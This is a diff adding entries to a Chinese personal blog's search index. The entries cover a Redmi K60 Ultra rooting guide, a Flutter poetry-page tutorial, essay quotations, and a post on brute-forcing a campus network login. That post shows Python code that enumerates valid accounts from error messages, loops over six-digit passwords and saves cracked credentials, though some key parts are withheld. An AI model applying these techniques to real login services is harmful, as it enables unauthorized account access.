@@ -1,6 +1,341 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>K60U刷机教程</title>
+    <url>/chenyang-tnt/posts/a4a20e09/</url>
+    <content><![CDATA[<h1 id="K60U刷机教程"><a href="#K60U刷机教程" class="headerlink" title="K60U刷机教程"></a>K60U刷机教程</h1><p>&emsp;&emsp;大家好！我是晨阳。</p>
+<p>&emsp;&emsp;好久没刷机了，昨晚心血来潮补了一下最新的刷机技巧，今天和大家分享一下红米K60U的刷机教程。</p>
+<p>&emsp;&emsp;刷机的前提是解锁bl，我们可以去官方下载解锁工具</p>
+<p>&emsp;&emsp;进入小米社区，打开K60至尊板块，然后就可以下载到解锁工具了。<br>刷机步骤：</p>
+<ol>
+<li><p>打开解锁工具进行解锁，登录账号然后跟着官方的提示就可以顺利解锁了（更新澎湃之后解锁需要向官方申请，请前往小米社区进行申请）</p>
+</li>
+<li><p>完成解锁之后，我们就可以使用fastboot进行一些刷操作了，一般我们都是会先获取root</p>
+</li>
+<li><p>root获取我们可以通过刷入修补好的init_boot.img，来获取。</p>
+</li>
+<li><p>init_boot.img文件怎么获取呢？<br>有线刷包的情况下可以直接解压获取，我这里下载了线刷包可以直接获取，卡刷包的话我们需要解包才能获取，<br>具体操作是这样的：卡刷包解压之后获得了这些文件，我们复制这个文件，将这个文件放到解包工具中，然后双击bat文件输入i，这样我们就提取成功了。</p>
+</li>
+<li><p>修补init_boot：<br>手机下载面具，然后选择修补boot，将init_boot文件放入进行修补，修补好之后，将文件复制到电脑；这个就是修补好的文件</p>
+</li>
+</ol>
+<p>接下来使用adb命令进行操作：<br>手机进入fastboot模式然后连接电脑进行操作。</p>
+<p><strong>然后重启手机就可以了</strong></p>
+]]></content>
+      <categories>
+        <category>实用教程</category>
+      </categories>
+      <tags>
+        <tag>玩机教程</tag>
+        <tag>手机</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>PureSky-Kit随机诗词功能开发</title>
+    <url>/chenyang-tnt/posts/6632d351/</url>
+    <content><![CDATA[<h1 id="PureSky-Kit-“随机诗词”功能开发"><a href="#PureSky-Kit-“随机诗词”功能开发" class="headerlink" title="PureSky_Kit-“随机诗词”功能开发"></a>PureSky_Kit-“随机诗词”功能开发</h1><p>除夕之日心血来潮打开Android Studio准备写一下上次画的饼了（“随机诗词”）。</p>
+<p>文笔不好，我写的这些感觉逻辑挺混乱的😂，不知道大家能不能看懂。</p>
+<p>有不懂的地方可以在评论区提问，我看到后会及时回复的。</p>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>想着模仿一下“西窗烛”的这个页面</p>
+<p><img src="/chenyang-tnt/upload/%E8%A5%BF%E7%AA%97%E7%83%9B%E9%A1%B5%E9%9D%A2.jpg"></p>
+<p>刚开始我觉得这个页面会很简单，没想到在开发过程中却并没有想象中的那么简单，第一天，我准备保留app的appbar，将那些功能全部安排在appbar上，第一天我确实是这样做的，并且还玩了一晚上。</p>
+<p>效果图：</p>
+<p><img src="/chenyang-tnt/upload/fce46c092cfc91d7d6be30b489933d9.jpg"></p>
+<p>因为第一天主要写的是页面逻辑，所以页面的ui还比较难看。</p>
+<p>这个页面开发成上图之后，我发现了一个问题，页面白了（也就是说数据加载不了了），我马上打开抓包软件抓了一下数据包，发现数据包内容提示，单日api请求已达上限，原来是我请求数据的这个接口会对请求数据进行规定，于是我在第二天进行了换源。</p>
+<p>第二天，将api更换并美化了一下UI</p>
+<p>效果图：</p>
+<p><img src="/chenyang-tnt/upload/4ae1429fe0b1568da92e88917639200.jpg"></p>
+<p>怎么样好看多了吧！</p>
+<h3 id="此功能唯一比较难的地方"><a href="#此功能唯一比较难的地方" class="headerlink" title="此功能唯一比较难的地方"></a>此功能唯一比较难的地方</h3><p>其实这个功能比较难的地方就是文本的竖排显示以及从右往左排列，不过好在最后都被我拿下了，哈哈哈。</p>
+<h2 id="开工"><a href="#开工" class="headerlink" title="开工"></a>开工</h2><h3 id="UI开发"><a href="#UI开发" class="headerlink" title="UI开发"></a>UI开发</h3><p>UI的结构图：</p>
+<p><img src="/chenyang-tnt/upload/image.png"></p>
+<p>UI的嵌套结构就是这样，通过这样的结构实现了模糊以及大方向模仿“西窗烛”。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Scaffold(</span><br><span class="line">body: Container(</span><br><span class="line">decoration: BoxDecoration(</span><br><span class="line">image: DecorationImage(</span><br><span class="line">image: AssetImage(&#x27;images/gushibeijing.jpeg&#x27;),</span><br><span class="line">fit: BoxFit.fill)</span><br><span class="line">),</span><br><span class="line">child: Stack(</span><br><span class="line">children: [</span><br><span class="line">Blur(</span><br><span class="line">blur: 10,</span><br><span class="line">blurColor: Colors.grey,</span><br><span class="line">colorOpacity: 0.2,</span><br><span class="line">child: Container()</span><br><span class="line">),</span><br><span class="line">Column(</span><br><span class="line">children: [</span><br><span class="line">// 状态栏高度填充组件 </span><br><span class="line">SizedBox(</span><br><span class="line">height: MediaQuery.of(context).padding.top + 12,</span><br><span class="line">),</span><br><span class="line">// 选择类型组建 </span><br><span class="line">Container(</span><br><span class="line">height: 22,</span><br><span class="line">width: double.infinity,</span><br><span class="line">child: Align(</span><br><span class="line">alignment: Alignment.centerLeft,</span><br><span class="line">child: Container(</span><br><span class="line">decoration: BoxDecoration(</span><br><span class="line">border: Border.all(color: Colors.white, width: 0.1</span><br><span class="line">),</span><br><span class="line">borderRadius: BorderRadius.all(Radius.circular(2))),</span><br><span class="line">margin: EdgeInsets.fromLTRB(20, 0, 0, 0),</span><br><span class="line">child: DropdownButton(</span><br><span class="line">dropdownColor: Colors.white10,</span><br><span class="line">underline: Container(height: 0),</span><br><span class="line">value: dropdownValue,</span><br><span class="line">icon: Visibility(</span><br><span class="line">visible: false,</span><br><span class="line"> child: Icon(Icons.arrowdownward)),</span><br><span class="line">items: DropdownMenuItemjson.map((String value) &#123;return DropdownMenuItem&lt;String&gt;(value: value,child: Center(child: Container(margin: EdgeInsets.fromLTRB(5, 0, 5, 0),</span><br><span class="line">child: Text(</span><br><span class="line">value,style: TextStyle(</span><br><span class="line">fontSize: 12.5,fontWeight: FontWeight.bold,</span><br><span class="line">color: Colors.white70,decoration:TextDecoration.none</span><br><span class="line">),</span><br><span class="line">),</span><br><span class="line">)</span><br><span class="line">)</span><br><span class="line">);&#125;).toList(),</span><br><span class="line">onChanged: (Object? value) &#123;if (mounted) &#123;setState(() &#123;_dropdownValue = value.toString();&#125;);print(&#x27;选择的诗词类型$_dropdownValue&#x27;);&#125;&#125;,),),),),// 卡片的组件 Expanded(flex: 1,</span><br><span class="line">child: FutureBuilder(future: runnet(_dropdownValue),</span><br><span class="line">builder: (BuildContext context,AsyncSnapshot&lt;dynamic&gt; snapshot) &#123;</span><br><span class="line">if (snapshot.connectionState ConnectionState.waiting) &#123;</span><br><span class="line">print(&#x27;加载中&#x27;);</span><br><span class="line">// 异步操作正在进行中，显示加载指示器 </span><br><span class="line">return Center(child: CircularProgressIndicator(),);&#125; </span><br><span class="line">else if (snapshot.hasError) &#123;</span><br><span class="line">print(&quot;数据出错&quot;);</span><br><span class="line">return Text(&#x27;Error:&#123;snapshot.data&#125;&#x27;);</span><br><span class="line">return RefreshIndicator(</span><br><span class="line">child: ListView(children: [Container(height: MediaQuery.of(context).size.height -150,width: MediaQuery.of(context).size.width,child: Container(height: double.infinity,width: double.infinity,margin:EdgeInsets.fromLTRB(40, 0, 40, 105),decoration: BoxDecoration(color: Color(0xB4CCBB79),image: DecorationImage(image: AssetImage(&#x27;images/gushibeijing.jpeg&#x27;),fit: BoxFit.fill,),borderRadius: BorderRadius.all(Radius.circular(8)),),child: FutureBuilder(future: textRenderingcontent(content),builder: (BuildContext context,AsyncSnapshot&lt;dynamic&gt; snapshot) &#123;if (snapshot.connectionState ConnectionState.waiting) &#123;print(&#x27;加载中&#x27;);</span><br><span class="line">// 异步操作正在进行中，显示加载指示器 </span><br><span class="line">return Center(child:CircularProgressIndicator(),);&#125; else if (snapshot.hasError) &#123;print(&quot;数据出错&quot;);return Text(&#x27;Error:&#123;snapshot.data&#125;&#x27;);return Row(children: [Expanded(flex: 0,child: FutureBuilder(future:_textRendering_author(author),builder: (BuildContextcontext,AsyncSnapshot&lt;dynamic&gt;snapshot) &#123;if (snapshot.connectionState ConnectionState.waiting) &#123;print(&#x27;加载中&#x27;);</span><br><span class="line">// 异步操作正在进行中，显示加载指示器 </span><br><span class="line">return Center(child:CircularProgressIndicator(),);&#125; else if (snapshot.hasError) &#123;print(&quot;数据出错&quot;);return Text(&#x27;Error:&#123;snapshot.data&#125;&#x27;);return Container(margin:EdgeInsets.all(15),child: Align(alignment: Alignment.bottomLeft,child: Column(mainAxisAlignment:MainAxisAlignment.end,children:snapshot.data,),),);&#125; else &#123;return Container();&#125;&#125;,),),Expanded(flex: 1,child: FutureBuilder(future:_textRendering_content(content),builder: (BuildContextcontext,AsyncSnapshot&lt;dynamic&gt;snapshot) &#123;if (snapshot.connectionState ConnectionState.waiting) &#123;print(&#x27;加载中&#x27;);</span><br><span class="line">// 异步操作正在进行中，显示加载指示器 </span><br><span class="line">return Center(child:CircularProgressIndicator(),);&#125; else if (snapshot.hasError) &#123;print(&quot;数据出错&quot;);return Text(&#x27;Error:&#123;snapshot.data&#125;&#x27;);return Container(margin:EdgeInsets.all(15),child: Align(alignment:Alignment.topRight,child: Row(mainAxisAlignment:MainAxisAlignment.end,children:snapshot.data,)),);&#125; else &#123;return Container();&#125;&#125;,),)],);&#125; else &#123;return Container();&#125;&#125;,),),)],),onRefresh: _shuaxin);&#125; else &#123;return Container();&#125;&#125;,))],)],),),)</span><br></pre></td></tr></table></figure>
+
+<p>这个就是页面UI的全部代码了，代码还可以优化，不过我不是学计算机的，代码能跑就行 哈哈哈</p>
+<h3 id="逻辑"><a href="#逻辑" class="headerlink" title="逻辑"></a>逻辑</h3><h4 id="下拉框功能实现"><a href="#下拉框功能实现" class="headerlink" title="下拉框功能实现"></a>下拉框功能实现</h4><p>下拉框的动态布局变量定义</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">List&lt;String&gt; DropdownMenuItemjson = [&#x27;全部&#x27;,&#x27;抒情&#x27;,&#x27;四季&#x27;,&#x27;山水&#x27;,&#x27;天气&#x27;,&#x27;人物&#x27;,&#x27;人生&#x27;,&#x27;生活&#x27;,&#x27;节日&#x27;,&#x27;动物&#x27;,&#x27;植物&#x27;,&#x27;食物&#x27;,&#x27;古籍&#x27;]; // 下拉菜单选项var _dropdownValue; // 下拉菜单选中的值</span><br></pre></td></tr></table></figure>
+
+<p>下拉框组件代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Container(</span><br><span class="line">height: 22,</span><br><span class="line">width: double.infinity,</span><br><span class="line">child: Align(</span><br><span class="line">alignment: Alignment.centerLeft,</span><br><span class="line">child: Container(</span><br><span class="line">decoration: BoxDecoration(</span><br><span class="line">border: Border.all(color: Colors.white, width: 0.1),</span><br><span class="line">borderRadius: BorderRadius.all(Radius.circular(2))),</span><br><span class="line">margin: EdgeInsets.fromLTRB(20, 0, 0, 0),</span><br><span class="line">child: DropdownButton(</span><br><span class="line">dropdownColor: Colors.white10,</span><br><span class="line">underline: Container(height: 0),</span><br><span class="line">value: dropdownValue,</span><br><span class="line">icon: Visibility(visible: false, child: Icon(Icons.arrowdownward)),</span><br><span class="line">items: DropdownMenuItemjson.map((String value) &#123;</span><br><span class="line">return DropdownMenuItem&lt;String&gt;(value: value,child: Center(child: Container(margin: EdgeInsets.fromLTRB(5, 0, 5, 0),child: Text(value,style: TextStyle(fontSize: 12.5,fontWeight: FontWeight.bold,color: Colors.white70,decoration: TextDecoration.none),),)));&#125;).toList(),</span><br><span class="line">onChanged: (Object? value) &#123;</span><br><span class="line">if (mounted) &#123;</span><br><span class="line">setState(() &#123;_dropdownValue = value.toString();&#125;);</span><br><span class="line">print(&#x27;选择的诗词类型$_dropdownValue&#x27;);&#125;&#125;,),),),)</span><br></pre></td></tr></table></figure>
+
+<p>下拉框逻辑函数：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DropdownMenuItemjson.map((String value) &#123;</span><br><span class="line">return DropdownMenuItem&lt;String&gt;(value: value,child: Center(child: Container(margin: EdgeInsets.fromLTRB(5, 0, 5, 0),child: Text(value,style: TextStyle(fontSize: 12.5,fontWeight: FontWeight.bold,color: Colors.white70,decoration: TextDecoration.none),),)));&#125;).toList(),</span><br></pre></td></tr></table></figure>
+
+<h4 id="文字竖排显示"><a href="#文字竖排显示" class="headerlink" title="文字竖排显示"></a>文字竖排显示</h4><p>文字竖排诗词排版我是通过将文字以逗号进行分隔获取诗词改获得的列数，然后将诗词以逗号分割转换为列表，分别取出列表里面的内容并获取内容的字符串长度将每一个文字设置为一行，并添加到对应的列中，就这样文字竖排排版显示就完成了</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 文本绘制代码_作者 </span><br><span class="line">Future textRenderingauthor(String author) async &#123;</span><br><span class="line">List&lt;Widget&gt; author_widget = []; // 保存作者的组件列表 var textRenderingauthor_length = author.length;for (var i = 0; i &lt; textRenderingauthor_length; i++) &#123;var onetext = author.substring(i, i + 1);</span><br><span class="line">author_widget.add(Text(_one_text,style: TextStyle(fontFamily: &quot;Slidechunfeng&quot;, fontSize: 19),));</span><br><span class="line">&#125;return author_widget;</span><br><span class="line">&#125;// 文本绘制代码_诗词 </span><br><span class="line">Future textRenderingcontent(String content) async &#123;</span><br><span class="line">List&lt;Widget&gt; content_widget_row = []; // 设置几列的组件列表 String content_list1 = content.replaceAll(&#x27;。&#x27;, &#x27;，&#x27;).replaceAll(&#x27;！&#x27;, &#x27;，&#x27;).replaceAll(&#x27;？&#x27;, &#x27;，&#x27;).replaceAll(&#x27;；&#x27;, &#x27;，&#x27;).replaceAll(&#x27;：&#x27;, &#x27;，&#x27;).replaceAll(&#x27;、&#x27;, &#x27;，&#x27;); // 格式化文本标点符号 var content_list = content_list1.split(&quot;，&quot;); // 以逗号为分割符，将文本转化为数组 for (var i in content_list) &#123;List&lt;Widget&gt; content_widget_column = []; // 保存诗词的组件列表 // 将数组文本拆分出来 </span><br><span class="line">var content_list_length = i.length;for (var j = 0; j &lt; content_list_length; j++) &#123;var onetext = i.substring(j, j + 1);content_widget_column.add(Text(_one_text,style: TextStyle(fontSize: 34, fontFamily: &quot;Slidechunfeng&quot;),));</span><br><span class="line">print(_one_text);&#125;content_widget_row.add(Container(margin: EdgeInsets.fromLTRB(5, 0, 0, 0),child: Column(children: content_widget_column,),));&#125;List&lt;Widget&gt; content_widget_row_reversed =content_widget_row.reversed.toList(); // 将列表数据倒序 return content_widget_row_reversed;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后就有这样的效果了</p>
+<h3 id=""><a href="#" class="headerlink" title=""></a><img src="/chenyang-tnt/upload/fce46c092cfc91d7d6be30b489933d9.jpg"></h3><h3 id="背景模糊"><a href="#背景模糊" class="headerlink" title="背景模糊"></a>背景模糊</h3><p>背景模糊使用blur插件实现</p>
+<p>方法就是，使用Stack()组件将卡片进行脱离文本流然后将背景模糊这样就实现了高斯模糊。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Blur(blur: 10,blurColor: Colors.grey,colorOpacity: 0.2,child: Container()),</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>编程学习</category>
+      </categories>
+      <tags>
+        <tag>Flutter</tag>
+        <tag>编程</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>web爆破技术分析</title>
+    <url>/chenyang-tnt/posts/b76f16d1/</url>
+    <content><![CDATA[<h1 id="Python实现Web爆破获取校园网账号密码"><a href="#Python实现Web爆破获取校园网账号密码" class="headerlink" title="Python实现Web爆破获取校园网账号密码"></a>Python实现Web爆破获取校园网账号密码</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>&emsp;&emsp;我们都知道当我们想要获取某些账号的密码时可以通过多种方式实现，比较常用的方法就是通过爆破的手段获得，可是现在的网站都会设置验证码等技术防止我们多次进行请求，从而阻止我们进行爆破。那是不是我们就无法进行爆破了呢？其实并不是，因为现在有很多的网站依旧在使用前端验证的方式试图阻止我们，但是前端的话我们只需要稍微分析一下发包或者逆向一下js代码就可以轻松绕过了。这篇文章主要也就是通过抓包来绕过前端验证并写python脚本来实现校园网账号的爆破。</p>
+<h2 id="第一步-web登录页面抓包分析"><a href="#第一步-web登录页面抓包分析" class="headerlink" title="第一步 web登录页面抓包分析"></a>第一步 web登录页面抓包分析</h2><p>&emsp;&emsp;我们尝试输入一个不存在的账号和密码，然后重复几次之后发现有验证码保护网页以免被爆破，这个时候我们单纯的靠web自动化已经不能很好的实现爆破了（其实还是有办法的，只不过比较麻烦而且爆破的效率还比较低）所以我们可以进行抓包分析。</p>
+<p>&emsp;&emsp;F12或者使用抓包工具对网页的发包进行拦截，获得web端法宝数据之后进行数据检索，找到我们输入的账号和密码。<br>发现有一个这样的请求接口（为了安全我没有给全接口地址）：</p>
+<blockquote>
+<p>**********************************?method&#x3D;login</p>
+</blockquote>
+<p>&emsp;&emsp;这个接口进行post发包，而且所发送的数据包含我们的账号和密码；这个接口的数据包字典是这样的：</p>
+<blockquote>
+<p>{<br>                        ‘userId’: userId,<br>                        ‘password’: 0,<br>                        ‘service’: service,  # 运营商标识<br>                        ‘operatorPwd’: ‘’,<br>                        ‘operatorUserId’: ‘’,<br>                        ‘validcode’: ‘’,<br>                        ‘passwordEncrypt’: ‘false’,<br>                        ‘queryString’: ‘这里被我删掉了，我看了一下就是包含本机的一些WLAN等配置，可能密码正确然后这个字段保存到服务器，服务器看到这个配置的机器发包然后就放行吧！’<br>                    }</p>
+</blockquote>
+<p>&emsp;&emsp;可以看到web端还是想对账号和密码加密然后再上传服务器判断的，可是不知道为什么还是明文传输，不过这样也好，方便我们接下来的操作（我们就不需要逆向js找到加密方式然后在python端写加密啦）。<br>&emsp;&emsp;完成这一步我们就算分析完web端的数据啦！接下来我们只需要对post字典进行修改封装然后post请求这个接口，根据返回信息来处理下一步操作就行了。</p>
+<h2 id="第二步-返回数据分析"><a href="#第二步-返回数据分析" class="headerlink" title="第二步 返回数据分析"></a>第二步 返回数据分析</h2><p>&emsp;&emsp;因为每次请求都会进行数据返回，所以我们可以通过对返回的数据进行分析来判断我们的python脚本接下来怎么操作。</p>
+<p>&emsp;&emsp;返回的json数据：</p>
+<blockquote>
+<p>{<br>    “result”: “some_result_data”,<br>    “message”: “some_message_data”<br>    …….<br>}</p>
+</blockquote>
+<p>&emsp;&emsp;因为我们分析数据基本上只使用到了这两个返回的参数，所以我就只放出这两段参数了。</p>
+<p>&emsp;&emsp;对返回的参数分析可知有一下几种情况：</p>
+<blockquote>
+<p>“result” ： “success”<br>“result” ： “false”<br>“message” ： “认证失败”<br>“message” ： “您未绑定服务对应的运营商!”<br>“message” ： “用户不存在或者密码错误!”<br>“message” ： “用户不存在,请输入正确的用户名!”<br>“message” ： “用户不允许使用本服务!”</p>
+</blockquote>
+<p>&emsp;&emsp;当返回”result” ： “success”时表示账号密码以及选定的服务正确，这时候我们就可以将这些数据记录下来，也就是爆破成功了；</p>
+<p>&emsp;&emsp;当返回 “result” ： “false”或者 “message” ： “认证失败”时说明我们当前机器已经连接上了校园网，我们需要断开之后才可以进行web爆破；</p>
+<p>&emsp;&emsp;当返回”message” ： “您未绑定服务对应的运营商!”或者”message” ： “用户不允许使用本服务!”时说明此时当前尝试的账号在这个运营商里面没数据但是存在此账号；</p>
+<p>&emsp;&emsp;当返回”message” ： “用户不存在或者密码错误!”时说明用户是存在的而且服务商也是正确的；<br>&emsp;&emsp;通过上面的分析我们就可以开始进行python脚本的编写了。</p>
+<h2 id="第三步-脚本编写"><a href="#第三步-脚本编写" class="headerlink" title="第三步 脚本编写"></a>第三步 脚本编写</h2><p>&emsp;&emsp;我们的web爆破其实就是简单粗暴的密码尝试，我们爆破的时候如果能够知道账号是否存在的话就能够定点爆破了，这样我们也可以省去很多的时间，那我们怎么知道账号是否存在呢？</p>
+<p>&emsp;&emsp;还是进行返回数据分析，我第二步说了每个返回数据代表的情况，所以我们可以从这里入手。</p>
+<p>&emsp;&emsp;写一个循环然后当返回当返回”message” ： “用户不存在或者密码错误!”时记录请求的账号以及运营商，这样我们很快就可以获得一个用户基本信息表了。</p>
+<p>实现的代码：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">userid_judgment</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n==================================用户信息存在检测=======================================&quot;</span>)</span><br><span class="line">    service_list = &#123;<span class="string">&quot;%E8%81%94%E9%80%9A&quot;</span>, <span class="string">&quot;%E7%A7%BB%E5%8A%A8&quot;</span>, <span class="string">&quot;%E7%94%B5%E4%BF%A1&quot;</span>, <span class="string">&quot;*****-WiFi&quot;</span>&#125;</span><br><span class="line">    user_star = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;用户开始值：&quot;</span>))</span><br><span class="line">    user_end = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;用户结束值：&quot;</span>))</span><br><span class="line">    chazhi = user_end - user_star</span><br><span class="line">    userId = user_star</span><br><span class="line">    <span class="keyword">if</span> user_star &gt; user_end:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;数值不合法&quot;</span>)</span><br><span class="line">        userid_judgment()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> chazhi &lt;= <span class="number">5000</span>:  <span class="comment"># 爆破阈值</span></span><br><span class="line">            i = <span class="number">1</span></span><br><span class="line">            <span class="keyword">while</span> userId &lt;= user_end:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;已运行&quot;</span>, i)</span><br><span class="line">                userId = userId + <span class="number">1</span></span><br><span class="line">                i = i + <span class="number">1</span></span><br><span class="line">                <span class="keyword">for</span> service <span class="keyword">in</span> service_list:</span><br><span class="line">                    parameter = &#123;</span><br><span class="line">                        <span class="string">&#x27;userId&#x27;</span>: userId,</span><br><span class="line">                        <span class="string">&#x27;password&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">                        <span class="string">&#x27;service&#x27;</span>: service,  <span class="comment"># 运营商标识</span></span><br><span class="line">                        <span class="string">&#x27;operatorPwd&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;operatorUserId&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;validcode&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;passwordEncrypt&#x27;</span>: <span class="string">&#x27;false&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;queryString&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">                    &#125;</span><br><span class="line">                    response = requests.post(url=url, params=parameter)</span><br><span class="line">                    response.encoding = <span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">                    response_zhuanhuan = response.json()</span><br><span class="line">                    message = response_zhuanhuan[<span class="string">&quot;message&quot;</span>]</span><br><span class="line">                    result = response_zhuanhuan[<span class="string">&quot;result&quot;</span>]</span><br><span class="line">                    <span class="built_in">print</span>(message)</span><br><span class="line">                    下面的代码将被隐藏，因为涉及到具体判断方式</span><br><span class="line">                ......</span><br></pre></td></tr></table></figure>
+
+<p>&emsp;&emsp;通过这样的操作我们就可以获得一个基本的用户信息表了。有了这个用户信息表之后我们就可以选定我们想要爆破的账号进行爆破啦！</p>
+<p>&emsp;&emsp;接下来只需要写一个循环爆破的函数就可以进行爆破了，我们可以使用字典，或者我们选定密码范围进行爆破，因为我通过一些人文方法了解到我们校园网密码一般设置为6为位，所以我可以更加方便的进行web爆破。</p>
+<p>&emsp;&emsp;web爆破代码我也只放一段吧：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># web暴力破解循环头</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cycle</span>(<span class="params">userId, password_start, password_end, start_end, service</span>):</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    password = password_start</span><br><span class="line">    <span class="keyword">if</span> i &lt;= <span class="number">50002</span>:  <span class="comment"># 暴力攻击最大次数</span></span><br><span class="line">        <span class="keyword">while</span> i &lt;= start_end:</span><br><span class="line">            i = i + <span class="number">1</span></span><br><span class="line">            password = <span class="built_in">str</span>(password).zfill(<span class="number">6</span>)</span><br><span class="line">            issuccess = <span class="string">&quot;非用户信息表&quot;</span></span><br><span class="line">            net_request(userId=userId, password=password, service=service, issuccess=issuccess, list_id=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;已循环&quot;</span>, i, <span class="string">&quot;次&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;尝试值：&quot;</span>, password)</span><br><span class="line">            password = <span class="built_in">int</span>(password) + <span class="number">1</span></span><br><span class="line">        a = <span class="built_in">input</span>(<span class="string">&quot;没有爆破成功，单击任意键退出&quot;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;以达到最大值，防止被老师暴打程序已自动终止&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>&emsp;&emsp;我们通过这个请求然后在进行判断：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">response = requests.post(url=url, params=parameter)</span><br><span class="line">        response.encoding = <span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">        result = response.json()[<span class="string">&#x27;result&#x27;</span>]</span><br><span class="line">        message = response.json()[<span class="string">&#x27;message&#x27;</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;返回json&quot;</span>, response.json())</span><br><span class="line">        <span class="keyword">if</span> result == <span class="string">&#x27;success&#x27;</span>:</span><br><span class="line">            cpb(userId, password)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;账号为：&quot;</span>, userId, <span class="string">&quot;密码为：&quot;</span>, password)</span><br><span class="line">            a = <span class="built_in">input</span>(<span class="string">&quot;记录密码成功&quot;</span>)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">elif</span> message == <span class="string">&#x27;认证失败&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;请链接校园网，并断开认证&quot;</span>)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+
+<p>&emsp;&emsp;为了方便后续查看我们获得的账号和密码，我们可以将其保存到本地的txt文件里面：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 创建密码本</span><br><span class="line">def cpb(userId, password):</span><br><span class="line">    cbk_b = &#123;</span><br><span class="line">        &#x27;userId&#x27;: userId,</span><br><span class="line">        &#x27;password&#x27;: password</span><br><span class="line">    &#125;</span><br><span class="line">    cbk_b1 = open(&#x27;校园网密码本.txt&#x27;, encoding=&#x27;utf-8&#x27;, mode=&#x27;a+&#x27;)</span><br><span class="line">    cbk_b1.write(str(cbk_b) + &#x27;\n&#x27;)</span><br><span class="line">    print(&#x27;添加成功&#x27;)</span><br><span class="line">    cbk_b1.close()</span><br><span class="line">    quchong(text_name=&quot;校园网密码本.txt&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>差不多web爆破的思路就是这样，因为涉及到学校网络安全，所以我没有给关键代码。</p>
+<h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>&emsp;&emsp;<strong>本文章旨在技术交流，请不要用于违法操作，所有没有获得授权的web爆破都是违法行为请不要轻易尝试。</strong></p>
+]]></content>
+      <categories>
+        <category>编程学习</category>
+      </categories>
+      <tags>
+        <tag>python</tag>
+        <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>作文素材-教学观念</title>
+    <url>/chenyang-tnt/posts/4564416b/</url>
+    <content><![CDATA[<h1 id="作文素材-教学观念"><a href="#作文素材-教学观念" class="headerlink" title="作文素材-教学观念"></a>作文素材-教学观念</h1><h2 id="素材一：名言警句"><a href="#素材一：名言警句" class="headerlink" title="素材一：名言警句"></a>素材一：名言警句</h2><p>1.只有让学生不把全部时间都用在学习上，而留下许多自由支配的时间，他才能顺利地学习……（这）是教育过程的逻辑。——苏霍姆林斯基</p>
+<p>2.求知欲好奇心，这是人的永恒的，不可改变的特性。哪里没有求知欲哪里便没有学校。——苏霍姆林斯基</p>
+<p>3.教育不能创造什么，但它能启发儿童创造力以从事于创造工作。——陶行知</p>
+<p>4.此刻的一切完美事物，无一不是创新的结果。—-穆勒</p>
+<p>5.有知识的人不实践，等于一只蜜蜂不酿蜜。——古波斯·萨迪</p>
+<h2 id="素材二：正面事实论据"><a href="#素材二：正面事实论据" class="headerlink" title="素材二：正面事实论据"></a>素材二：正面事实论据</h2><h3 id="1-唤醒“石狮子”"><a href="#1-唤醒“石狮子”" class="headerlink" title="1.唤醒“石狮子”"></a><strong>1.唤醒“石狮子”</strong></h3><p>苏格拉底的父亲是雕刻师，一天，他问正在雕刻石狮子的父亲，怎样才能成为一个好的雕刻师。父亲说：“看！拿这头石狮子来说吧，我并不是在雕刻这头狮子，我只是在唤醒它。”父亲进一步解释说：“狮子本来就沉睡在石块中，我只是将它从石头的监牢里解救出来而已。</p>
